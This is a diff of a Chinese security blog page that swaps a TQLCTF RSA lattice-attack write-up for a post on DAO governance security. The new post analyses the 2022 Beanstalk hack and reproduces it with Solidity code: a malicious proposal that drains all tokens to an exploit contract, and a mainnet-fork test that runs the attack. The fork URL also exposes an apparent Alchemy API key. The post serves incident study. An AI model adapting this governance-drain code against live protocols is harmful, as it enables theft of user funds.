@@ -4,10 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="TQLCTF2022 hardrsa, Latt1ce&#39;s Blog">
-    <meta name="description" content="TQLCTF 2022.2.19-2022.2.20hardrsa题目源码：from sage.all import *
-from Crypto.Util.number import bytes_to_long
-from secret im">
+    <meta name="keywords" content="从Benstalks攻击事件浅谈治理合约的安全问题, Latt1ce&#39;s Blog">
+    <meta name="description" content="介绍Governance 顾名思义，即为治理。区块链的出现，让去中心化的治理成为一个新的方向，即我们所说的DAO(Decentralized Autonomous Organization)。
+链上治理可以让社区的成员参与到治理中来，让社区">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +18,7 @@ from secret im">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>TQLCTF2022 hardrsa | Latt1ce&#39;s Blog</title>
+    <title>从Benstalks攻击事件浅谈治理合约的安全问题 | Latt1ce&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
     <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
@@ -313,12 +312,12 @@ from secret im">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">TQLCTF2022 hardrsa</h1>
+                    <h1 class="description center-align post-title">从Benstalks攻击事件浅谈治理合约的安全问题</h1>
                 </div>
             </div>
         </div>
@@ -446,7 +445,7 @@ from secret im">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-04-20
+                    2023-03-04
                 </div>
                 
 
@@ -470,140 +469,145 @@ from secret im">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="TQLCTF-2022-2-19-2022-2-20"><a href="#TQLCTF-2022-2-19-2022-2-20" class="headerlink" title="TQLCTF 2022.2.19-2022.2.20"></a>TQLCTF 2022.2.19-2022.2.20</h1><h2 id="hardrsa"><a href="#hardrsa" class="headerlink" title="hardrsa"></a>hardrsa</h2><h3 id="题目源码："><a href="#题目源码：" class="headerlink" title="题目源码："></a>题目源码：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sage<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span>
-<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> bytes_to_long
-<span class="token keyword">from</span> secret <span class="token keyword">import</span> flag
+                <h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Governance 顾名思义，即为治理。区块链的出现，让去中心化的治理成为一个新的方向，即我们所说的DAO(Decentralized Autonomous Organization)。</p>
+<p>链上治理可以让社区的成员参与到治理中来，让社区的成员更加的自治，更加的去中心化。提案的种类也有很多，比如参数修改、合约升级、资源管理等。</p>
+<p>这一讲我们将首先分析链上治理的过程，让大家了解治理的过程，然后通过一道赛题来了解到链上治理可能面临的风险漏洞。</p>
+<h1 id="Compound-Governance-protocol"><a href="#Compound-Governance-protocol" class="headerlink" title="Compound Governance protocol"></a>Compound Governance protocol</h1><p>作为经典的治理协议，openzeppelin的治理沿用了Compound的治理协议，具体文档为：<a target="_blank" rel="noopener" href="https://docs.openzeppelin.com/contracts/4.x/api/governance">https://docs.openzeppelin.com/contracts/4.x/api/governance</a></p>
+<p>在这里我们简要介绍一下协议。</p>
+<h2 id="ERC20Votes"><a href="#ERC20Votes" class="headerlink" title="ERC20Votes"></a>ERC20Votes</h2><p>ERC20Votes 是 ERC20 token的一个拓展，ERC20Votes token 即代表了<strong>投票权</strong>，其最大特点就是维护了一个checkpoint数组，记录了用户余额快照，这允许将<strong>投票权映射到过去余额的快照而不是当前余额</strong>，这有助于防止知道有重要提案即将出现并试图通过购买更多代币然后抛售它们来增加他们的投票权的成员投票。</p>
+<p>同时还拥有delegate()委托函数：传入delegatee参数，<strong>将自己的投票权委托给delegatee</strong></p>
+<h2 id="Governor"><a href="#Governor" class="headerlink" title="Governor"></a>Governor</h2><p>治理者合约决定了法定人数所需的投票数量的百分比(例如，如果法定人数是4%，那么只有4%的选民需要投票支持提案通过)，投票期限，即投票持续多长时间，投票延迟，即提案创建后多长时间允许成员更改他们拥有的代币数量。治理合约还提供创建提案、投票和执行提案的功能。</p>
+<p>而一个提案的生命周期，可以用下图表示。</p>
+<p><img src="/../img/gov_diagram.png"></p>
+<p>这里介绍几个关键函数</p>
+<ul>
+<li><p>propose() 提案函数：满足代币持有量的可以提案，须传入address, value, signature, calldata等参数</p>
+</li>
+<li><p>castVote() 投票函数：传入proposalId, support参数，含有for, against, abstain三种选择</p>
+</li>
+<li><p>queue() 队列函数：提案成功后，任何人可以调用，传入proposalId参数，将提案加入队列</p>
+</li>
+<li><p>execute() 执行函数：当时间满足要求后，任何人都可以调用，传入proposalId参数，将提案从队列中取出执行</p>
+</li>
+</ul>
+<h2 id="Timelock"><a href="#Timelock" class="headerlink" title="Timelock"></a>Timelock</h2><ul>
+<li>delay(延时)：一个提案被接受后，需要等待多少天之后才能被执行。这个时间可以由治理合约改变为2至30天之间。目前设置为2天。</li>
+<li>提案执行期限(grace period)：在延时到达时间之后，如果超过了grace period期，那么提案将不能再执行，被设置为14天。</li>
+</ul>
+<h1 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h1><p>去中心化的治理在带来民主的同时，由于提案投票权利的分散，也带来了安全性的问题。因此，治理协议的安全性是一个非常重要的问题。</p>
+<p>想象一下，如果黑客可以通过恶意提案、大量投票从而达到控制项目、转移资产，后果是不堪设想的。</p>
+<p>在我之前的写过的AAADAO的wp中，就是一个典型的治理合约闪电贷攻击，感兴趣的朋友可以看看。</p>
+<h2 id="真实案例"><a href="#真实案例" class="headerlink" title="真实案例"></a>真实案例</h2><h3 id="The-Beanstalk-Hack"><a href="#The-Beanstalk-Hack" class="headerlink" title="The Beanstalk Hack"></a>The Beanstalk Hack</h3><p>2022年4月，Beanstalk被治理攻击，损失了181w$。并且，黑客捐赠了25万给了乌克兰战争基金地址。</p>
+<p>起因是治理协议中含有<code>emergencyCommit</code>紧急执行函数，周期为一天，当有2/3的赞成票时即可立即执行，如下图。</p>
+<p><img src="/../img/gov_1.jpg" alt="image"></p>
+<p>首先，黑客进行了恶意提案，提案内容为偷走合约中所有的钱，下图标出了恶意提案地址和提案执行签名。</p>
+<p><img src="/../img/gov_2.png" alt="image"></p>
+<p>而再在治理协议中，投票权重由向Beanstalk协议的Diamond contract的捐赠决定。于是在一天之后，黑客发起了攻击。<br>黑客的主要攻击流程为：</p>
+<ul>
+<li>通过闪电贷获得DAI，USDT，USDC</li>
+<li>再次通过uniswap，sushiswap 闪电贷得到BEAN 和 LUSD</li>
+<li>使用DAI，USDT，USDC换取 3CRV</li>
+<li>再将3CRV，LUSD，BEAN换取BEAN3CRV-f，BEANLUSD-f</li>
+<li>将BEAN3CRV-f，BEANLUSD-f存入Diamond 中</li>
+<li><strong>对BIP18恶意提案进行投票</strong></li>
+<li>执行恶意提案，将BEAN3CRV-f，BEANLUSD-f，uni-v2发送给黑客合约</li>
+<li>通过兑换将BEAN3CRV-f，BEANLUSD-f换取USDT，USDC，DAI</li>
+<li>burn uni-v2换取ETH和BEAN</li>
+<li>偿还闪电贷，再将多余的代币换为ETH，黑客获利</li>
+<li><em>黑客还发送了25000USDT给了乌克兰战争基金地址</em></li>
+</ul>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="恶意提案"><a href="#恶意提案" class="headerlink" title="恶意提案"></a>恶意提案</h3><pre class="line-numbers language-solididy" data-language="solididy"><code class="language-solididy">// SPDX-License-Identifier: MIT
+pragma solidity 0.8.10;
 
-<span class="token keyword">assert</span> flag<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"TQLCTF{"</span><span class="token punctuation">)</span>
-<span class="token keyword">assert</span> flag<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"}"</span><span class="token punctuation">)</span>
+import "forge-std/Test.sol";
+import {IERC20} from "../interfaces/IERC20.sol";
 
-beta  <span class="token operator">=</span> <span class="token number">0.223</span>
-delta <span class="token operator">=</span> <span class="token number">0.226</span>
-gama  <span class="token operator">=</span> <span class="token number">0.292</span>
-n_size <span class="token operator">=</span> <span class="token number">1024</span>
-bound_q <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">**</span><span class="token builtin">int</span><span class="token punctuation">(</span>n_size<span class="token operator">*</span>beta<span class="token punctuation">)</span>
-bound_p <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">**</span><span class="token builtin">int</span><span class="token punctuation">(</span>n_size<span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">-</span>beta<span class="token punctuation">)</span><span class="token punctuation">)</span>
+contract BIP18 is Test {
+    address constant BEAN = address(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db);
+    address constant BEAN_STALK = address(0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5);
+    address constant BEANCRV_F =
+        address(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);
+    address constant BEANLUSD_F =
+        address(0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D);
+    address constant PROPOSER =
+        address(0x1c5dCdd006EA78a7E4783f9e6021C32935a10fb4);
+    address constant UNI_V2_BEAN_LP =
+        address(0x87898263B6C5BABe34b4ec53F22d98430b91e371);
+    address immutable EXPLOIT_CONTRACT;
 
-<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
-    p <span class="token operator">=</span> random_prime<span class="token punctuation">(</span>bound_p<span class="token punctuation">,</span> proof<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
-    q <span class="token operator">=</span> random_prime<span class="token punctuation">(</span>bound_q<span class="token punctuation">,</span> proof<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
-    N <span class="token operator">=</span> p <span class="token operator">*</span> q
-    <span class="token keyword">if</span> q <span class="token operator">&lt;</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>N<span class="token punctuation">,</span> beta<span class="token punctuation">)</span> <span class="token keyword">and</span> gcd<span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
-        <span class="token keyword">break</span>
+    constructor(address _exploitAddr) {
+        EXPLOIT_CONTRACT = _exploitAddr;
+    }
+
+    function init() external {
+        console.log("exploit contract address: ", EXPLOIT_CONTRACT);
+        IERC20(BEAN).transfer(EXPLOIT_CONTRACT, IERC20(BEAN).balanceOf(BEAN_STALK));
+        IERC20(UNI_V2_BEAN_LP).transfer(EXPLOIT_CONTRACT, IERC20(UNI_V2_BEAN_LP).balanceOf(BEAN_STALK));
+        IERC20(BEANCRV_F).transfer(EXPLOIT_CONTRACT, IERC20(BEANCRV_F).balanceOf(BEAN_STALK));
+        IERC20(BEANLUSD_F).transfer(EXPLOIT_CONTRACT, IERC20(BEANLUSD_F).balanceOf(BEAN_STALK));
+        // 偷走所有tokens &amp; LP tokens
+    }
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="恶意提案执行"><a href="#恶意提案执行" class="headerlink" title="恶意提案执行"></a>恶意提案执行</h3><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token number">0.8</span><span class="token number">.10</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token string">"../src/BIP18.sol"</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token string">"../src/attack.sol"</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token string">"forge-std/Test.sol"</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token string">"../interfaces/IUniswapV2Router.sol"</span><span class="token punctuation">;</span>
+
+<span class="token keyword">contract</span> <span class="token class-name">BeanExp</span> <span class="token keyword">is</span> Test<span class="token punctuation">{</span>
+    IBeanStalk <span class="token keyword">constant</span> BEAN_STALK <span class="token operator">=</span> <span class="token function">IBeanStalk</span><span class="token punctuation">(</span><span class="token number">0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token builtin">address</span> <span class="token keyword">constant</span> BEAN <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0xDC59ac4FeFa32293A95889Dc396682858d52e5Db</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    IUniswapV2Router <span class="token keyword">constant</span> uniswapv2 <span class="token operator">=</span> <span class="token function">IUniswapV2Router</span><span class="token punctuation">(</span><span class="token keyword">payable</span><span class="token punctuation">(</span><span class="token number">0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token builtin">string</span>  url <span class="token operator">=</span> <span class="token string">"https://eth-mainnet.g.alchemy.com/v2/qb4zUY4FDtmZMhaAEHblyllY9gc1nj2S"</span><span class="token punctuation">;</span>
+    <span class="token builtin">uint256</span> forkId<span class="token punctuation">;</span>
+    BIP18 bip18<span class="token punctuation">;</span>
+    BeanExploit beanexp<span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">setUp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>
+        <span class="token comment">// 恶意提案高度  14595906 </span>
+        <span class="token comment">// 攻击开始高度  14602789</span>
+        forkId <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">createFork</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token number">14595905</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        vm<span class="token punctuation">.</span><span class="token function">selectFork</span><span class="token punctuation">(</span>forkId<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">testexp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span><span class="token punctuation">{</span>
+        <span class="token builtin">address</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> path <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">address</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        path<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> uniswapv2<span class="token punctuation">.</span><span class="token function">WETH</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        path<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> BEAN<span class="token punctuation">;</span>
+        uniswapv2<span class="token punctuation">.</span>swapExactETHForTokens<span class="token punctuation">{</span>value<span class="token punctuation">:</span> <span class="token number">75</span> ether<span class="token punctuation">}</span><span class="token punctuation">(</span>
+            <span class="token number">0</span><span class="token punctuation">,</span>
+            path<span class="token punctuation">,</span>
+            <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+            block<span class="token punctuation">.</span>timestamp <span class="token operator">+</span> <span class="token number">120</span>
+        <span class="token punctuation">)</span><span class="token punctuation">;</span>
+        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>
+            <span class="token string">"swap ETH -&gt; BEAN , Bean balance of attacker:"</span><span class="token punctuation">,</span>
+            <span class="token function">IERC20</span><span class="token punctuation">(</span>BEAN<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">10</span><span class="token operator">**</span><span class="token number">6</span>
+        <span class="token punctuation">)</span><span class="token punctuation">;</span>
         
-<span class="token keyword">assert</span> p<span class="token punctuation">.</span>is_prime<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token keyword">assert</span> q<span class="token punctuation">.</span>is_prime<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token function">IERC20</span><span class="token punctuation">(</span>BEAN<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>BEAN_STALK<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">type</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">.</span>max<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        BEAN_STALK<span class="token punctuation">.</span><span class="token function">depositBeans</span><span class="token punctuation">(</span><span class="token function">IERC20</span><span class="token punctuation">(</span>BEAN<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        beanexp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeanExploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        bip18 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BIP18</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>beanexp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        IDiamondCut<span class="token punctuation">.</span>FacetCut<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> _cut <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">IDiamondCut</span><span class="token punctuation">.</span>FacetCut<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        BEAN_STALK<span class="token punctuation">.</span><span class="token function">propose</span><span class="token punctuation">(</span>_cut<span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span>bip18<span class="token punctuation">)</span><span class="token punctuation">,</span> abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">"init()"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Successfully proposed: "</span><span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span>bip18<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
-    dp <span class="token operator">=</span> randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">**</span><span class="token builtin">int</span><span class="token punctuation">(</span>n_size <span class="token operator">*</span> delta<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    dq <span class="token operator">=</span> randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    <span class="token keyword">if</span> gcd<span class="token punctuation">(</span>dp<span class="token punctuation">,</span> p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token keyword">and</span> gcd<span class="token punctuation">(</span>dq<span class="token punctuation">,</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
-        <span class="token keyword">break</span>
-        
-d <span class="token operator">=</span> crt<span class="token punctuation">(</span><span class="token punctuation">[</span>dp<span class="token punctuation">,</span> dq<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-e <span class="token operator">=</span> inverse_mod<span class="token punctuation">(</span>d<span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>
-<span class="token keyword">assert</span> d <span class="token operator">&gt;</span> <span class="token number">2</span> <span class="token operator">*</span> N <span class="token operator">**</span> gama
-
-m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"N=</span><span class="token interpolation"><span class="token punctuation">{</span>N<span class="token punctuation">}</span></span><span class="token string">\ne=</span><span class="token interpolation"><span class="token punctuation">{</span>e<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"c=</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>N<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
-
-<span class="token comment">#N=17898692915537057253027340409848777379525990043216176404521845629792286203459681133425615460580210961931628383718238208402935069434512008997422795968676635886265184398587211149645171148089263697198308448184434844310802022336492929706736607458307830462086477073132852687216229392067680807130235274969547247389</span>
-<span class="token comment">#e=7545551830675702855400776411651853827548700298411139797799936263327967930532764763078562198672340967918924251144028131553633521880515798926665667805615808959981427173796925381781834763784420392535231864547193756385722359555841096299828227134582178397639173696868619386281360614726834658925680670513451826507</span>
-<span class="token comment">#c=2031772143331409088299956894510278261053644235222590973258899052809440238898925631603059180509792948749674390704473123551866909789808259315538758248037806795516031585011977710042943997673076463232373915245996143847637737207984866535157697240588441997103830717158181959653034344529914097609427019775229834115</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>观察到脚本中有<code>beta</code> 、<code>delta</code> 、<code>gama</code>等参数，猜测本题应该会与coppersmith攻击和lattice相关</p>
-<p>同时可以观察到加密脚本中使用了CRT对RSA的使用</p>
-<p>并且p,q两素数位数相差过大，故根据关键词<em>coppersmith、lattice、CRT、RSA</em>进行检索，搜索到 Alexander May在2002年发表的一篇论文<em>Cryptanalysis of Unbalanced RSA with Small CRT-Exponent</em></p>
-<p>发现其中情况与题目中描述的完全一致，并且满足<strong>section 5</strong> 中<strong>An approach modulo e</strong>的情况，故仔细阅读该部分，实现其攻击方法。</p>
-<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span>mm<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>tt<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    beta  <span class="token operator">=</span> <span class="token number">0.233</span>
-    delta <span class="token operator">=</span> <span class="token number">0.226</span>
-    gama  <span class="token operator">=</span> <span class="token number">0.292</span>
-
-    <span class="token comment"># print(1-2/3*(beta+sqrt(3*beta+beta^2)))</span>
-    <span class="token comment">#原题的数据</span>
-    N<span class="token operator">=</span><span class="token number">17898692915537057253027340409848777379525990043216176404521845629792286203459681133425615460580210961931628383718238208402935069434512008997422795968676635886265184398587211149645171148089263697198308448184434844310802022336492929706736607458307830462086477073132852687216229392067680807130235274969547247389</span>
-    e<span class="token operator">=</span><span class="token number">7545551830675702855400776411651853827548700298411139797799936263327967930532764763078562198672340967918924251144028131553633521880515798926665667805615808959981427173796925381781834763784420392535231864547193756385722359555841096299828227134582178397639173696868619386281360614726834658925680670513451826507</span>
-    c<span class="token operator">=</span><span class="token number">2031772143331409088299956894510278261053644235222590973258899052809440238898925631603059180509792948749674390704473123551866909789808259315538758248037806795516031585011977710042943997673076463232373915245996143847637737207984866535157697240588441997103830717158181959653034344529914097609427019775229834115</span>
+        vm<span class="token punctuation">.</span><span class="token function">warp</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>timestamp <span class="token operator">+</span> <span class="token number">1</span> days<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        beanexp<span class="token punctuation">.</span><span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
     
-    Y<span class="token operator">=</span>floor<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>N<span class="token punctuation">,</span>delta<span class="token operator">+</span>beta<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    Z<span class="token operator">=</span>floor<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>N<span class="token punctuation">,</span>beta<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    
-    dd<span class="token operator">=</span><span class="token punctuation">(</span>mm<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>mm<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token operator">+</span>tt<span class="token operator">*</span><span class="token punctuation">(</span>mm<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>
-    P<span class="token punctuation">.</span><span class="token operator">&lt;</span>y<span class="token punctuation">,</span>z<span class="token operator">&gt;</span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>
-    pol<span class="token operator">=</span>y<span class="token operator">*</span><span class="token punctuation">(</span>N<span class="token operator">-</span>z<span class="token punctuation">)</span><span class="token operator">+</span>N
-    
-    <span class="token comment"># print(pol(y=k-1,z=q)%e)</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-    G <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
-    <span class="token keyword">for</span> ii <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>mm<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">for</span> jj <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>mm<span class="token operator">-</span>ii<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-            G<span class="token punctuation">.</span>append<span class="token punctuation">(</span>e<span class="token operator">**</span><span class="token punctuation">(</span>mm<span class="token operator">-</span>ii<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token operator">**</span>jj<span class="token operator">*</span>pol<span class="token punctuation">(</span>y<span class="token punctuation">,</span>z<span class="token punctuation">)</span><span class="token operator">**</span>ii<span class="token punctuation">)</span>
-    <span class="token keyword">for</span> ii <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>mm<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
